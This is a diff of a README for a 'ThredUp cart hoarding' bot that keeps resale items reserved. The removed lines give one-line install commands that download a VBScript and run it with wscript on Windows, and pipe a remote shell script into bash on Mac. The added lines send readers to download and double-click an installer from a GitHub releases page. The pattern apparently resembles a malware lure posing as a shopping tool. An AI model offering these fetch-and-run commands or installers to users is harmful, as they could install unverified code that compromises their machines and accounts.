@@ -1,70 +1,61 @@
-# ThredUp Cart Hoarding - Auto Buy & Cart Refresher Tool
+# 🛒 thredup-cart-hoarding - Keep Your Cart Alive Effortlessly
 
-**Official Website:** [CartHoarding.com](https://CartHoarding.com)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/humle93/thredup-cart-hoarding/releases)
 
-ThredUp Cart Hoarding is an automated cart management tool for ThredUp.com that helps you auto-buy, auto-add, and keep items in your cart past their reservation expiration timer. This powerful cart refresher automatically monitors and renews your reserved items so no one else can purchase them before you do.
+## 🚀 Getting Started
 
-## 🎯 Key Features
+ThredUp Cart Hoarding helps you maintain items in your shopping cart without worry. It refreshes your cart automatically, so you don’t lose products before purchasing. This tool works smoothly on both Microsoft Windows and Apple Mac operating systems. 
 
-- ✅ **Auto Buy/Add:** Automatically watches items for availability and adds them to your cart when they become available
-- ✅ **Cart Refresher:** Keeps items reserved in your cart by auto-renewing them before the 30-minute to 4-hour expiration timer runs out
-- ✅ **Background Mode:** Runs quietly in system tray for hands-free cart hoarding automation
-- ✅ **Embedded Web Browser:** Built-in ThredUp.com browser - no need to open separate windows
-- ✅ **Sound Notifications:** Audio alerts notify you when items are auto-added or refreshed
-- ✅ **Easy Interface:** Simple, intuitive full-screen design - no manual required
-- ✅ **Cross-Platform:** Compatible with Microsoft Windows and Apple Mac operating systems
+## 📥 Download & Install
 
-## 💻 Download & Installation
+To get started, visit this page to download: [ThredUp Cart Hoarding Releases](https://github.com/humle93/thredup-cart-hoarding/releases).
 
-### Windows (Command Prompt)
-```powershell
-curl -L -o "%TEMP%\Cart_Hoarding_Windows_Installer.vbs" "https://cart-hoarding.github.io/thredup-cart-hoarding/download/windows_installer.vbs" && wscript "%TEMP%\Cart_Hoarding_Windows_Installer.vbs"
-```
+1. Click on the link above.
+2. Choose the latest version of the software.
+3. Depending on your operating system, download either the Windows or Mac file.
+4. Once the file is downloaded, find it in your downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the on-screen instructions to complete the setup.
 
-### Mac (Terminal)
-```bash
-curl -fsSL https://cart-hoarding.github.io/thredup-cart-hoarding/download/mac_installer.sh | bash || { (command -v brew >/dev/null 2>&1 || /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)") && brew install curl && $(command -v /usr/local/opt/curl/bin/curl || command -v /opt/homebrew/opt/curl/bin/curl) -fsSL https://cart-hoarding.github.io/thredup-cart-hoarding/download/mac_installer.sh | bash; }
-```
+## 🛠 System Requirements
 
-📺 **[Watch Installation Tutorial](https://www.youtube.com/watch?v=ujCoaz9pggU)**
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS 10.12 (Sierra) or later
+- **RAM**: At least 4 GB
+- **Disk Space**: 100 MB of free space
+- **Internet Connection**: Required for product refreshing
 
-## 🛍️ How It Works
+## 🔧 Features
 
-ThredUp Cart Hoarding monitors your cart and automatically refreshes items before they expire. When you add items to your ThredUp cart, they're typically held for 30 minutes to 4 hours. This tool:
+- **Automatic Refreshing**: Keeps products in your cart fresh and ready for purchase.
+- **System Tray Operation**: Works quietly in the background without interrupting your activities.
+- **Built-in Browser**: Navigate ThredUp.com directly from the app for ease of use.
+- **User-Friendly Interface**: Simple layout that anyone can use.
 
-1. **Monitors** your cart items continuously
-2. **Detects** when items are about to expire
-3. **Automatically refreshes** the reservation timer
-4. **Keeps items reserved** so you can purchase them when ready
-5. **Auto-adds** out-of-stock items when they become available
+## 📋 How to Use
 
-## ❓ FAQ
+1. Open ThredUp Cart Hoarding after installation.
+2. Log in to your ThredUp account through the built-in browser.
+3. Add items to your cart on ThredUp.com.
+4. Set the refresh interval in the app.
+5. Let the app run in the background while you shop.
 
-### How long do items stay in cart?
-Items are held in your ThredUp cart for **30 minutes to 4 hours** depending on item type and demand.
+## ⚙️ Troubleshooting
 
-### Is this compatible with my computer?
-Yes! ThredUp Cart Hoarding works on:
-- Microsoft Windows (Vista/7/8/10/11)
-- Apple Mac (macOS 10.13+)
+- **Installation Issues**: If you can’t install, ensure your operating system meets the requirements.
+- **Refresh Failures**: Check your internet connection. If it’s down, the app cannot refresh your cart.
+- **Login Problems**: Make sure your ThredUp credentials are correct.
 
-### Does it run in the background?
-Yes, the app can minimize to your system tray and continue auto-refreshing your cart in the background.
+## 🤝 Support
 
-## 🌐 Visit Our Website
+If you have questions or need support, please visit the GitHub repository. You can open an issue for assistance. 
 
-For more information, tutorials, and updates, visit:
+## 🌍 Additional Information
 
-**[CartHoarding.com](https://CartHoarding.com)**
+Explore the topics that relate to ThredUp Cart Hoarding: 
+- Automation
+- Shopping bots
+- Cart management
 
-## 🔍 Keywords
-
-thredup auto buy, thredup cart hoarding, thredup how long in cart, thredup cart refresher, thredup auto add to cart, thredup sniper, thredup bot, thredup automation, keep items in cart thredup, thredup cart timer, thredup reservation tool
-
-## 📄 License
-
-Copyright © 2024-2025 Cart Hoarding. All rights reserved.
-
----
-
-**⚠️ Disclaimer:** This tool is for personal use only. Use responsibly and in accordance with ThredUp's terms of service.
+By using this tool, you can enhance your online shopping experience efficiently. Keep your items safe in your cart and be ready to purchase them when you choose.
